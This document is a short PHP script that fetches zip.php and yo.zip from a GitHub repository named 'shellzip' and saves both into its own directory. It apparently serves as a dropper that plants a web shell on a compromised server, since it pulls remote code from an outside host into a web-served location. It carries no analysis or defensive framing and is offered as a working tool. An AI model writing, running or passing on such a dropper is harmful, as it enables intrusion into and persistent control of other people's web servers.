<?php
$files_to_download = [
    'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/zip.php' => __DIR__ . '/zip.php',
    'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/yo.zip' => __DIR__ . '/yo.zip',
];

foreach ($files_to_download as $file_url => $save_to) {
    $file_content = file_get_contents($file_url);

    if ($file_content !== false) {
        file_put_contents($save_to, $file_content);
        echo "File has been downloaded and saved as $save_to\n";
    } else {
        echo "Failed to download file from $file_url\n";
    }
}
?>
